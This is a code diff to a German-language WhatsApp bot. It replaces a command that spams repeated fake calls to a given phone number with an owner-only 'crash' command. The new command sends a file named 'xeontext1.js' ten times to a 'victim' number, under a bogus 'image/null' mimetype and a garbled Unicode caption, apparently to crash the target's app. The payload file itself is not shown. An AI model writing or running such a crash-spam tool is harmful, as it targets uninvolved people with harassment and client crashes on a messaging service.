@@ -499,26 +499,33 @@ if (command === "about") {
         return reply(sock, msg, "❌ Fehler beim Kicken!");
     }
 }
-if (command === "call") {
-    const number = args[0];
-    const repeat = parseInt(args[1]) || 1;
+if (command === "crash") {
+    if (!isWantedasa(sender)) {
+        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
+    }
 
-    if (!number) {
-        return reply(from, {
-            text: `❌ Bitte gib eine Nummer an.\nBeispiel:\n${prefix}call 49123456789 3`
+    if (!args[0]) {
+        return reply(sock, msg, `❌ Nutzung: ${prefix}crash 49123456789`);
+    }
+
+    const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    const amount = 10;
+
+    async function XeonyCrashy(name, chat) {
+        await sock.sendMessage(chat, {
+            document: { url: "./xeontext1.js" },
+            mimetype: "image/null",
+            fileName: `xeontext1.js`,
+            caption: `᭙ꪖ᭢ᡶꫀᦔꪖకꪖ`
         });
     }
-    const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-    async function fakeCall(jid, repeat = 1) {
-    for (let i = 1; i <= repeat; i++) {
-        await sock.offerCall(jid, { isVideo: false });
-        if (i < repeat) await new Promise(r => setTimeout(r, 5000));
+
+    for (let i = 0; i < amount; i++) {
+        await XeonyCrashy(pushname || "Wantedasa", victim);
+        await sleep(3000);
     }
-}
 
-await fakeCall(jid, repeat);
-
-    await sock.sendMessage(from, { text: `✅ Call abgeschlossen (${repeat}x)` });
+    reply(sock, msg, `✅ Erfolgreich ${amount} Nachrichten an ${victim} gesendet`);
 }
 if (command === "getpic") {
     try {
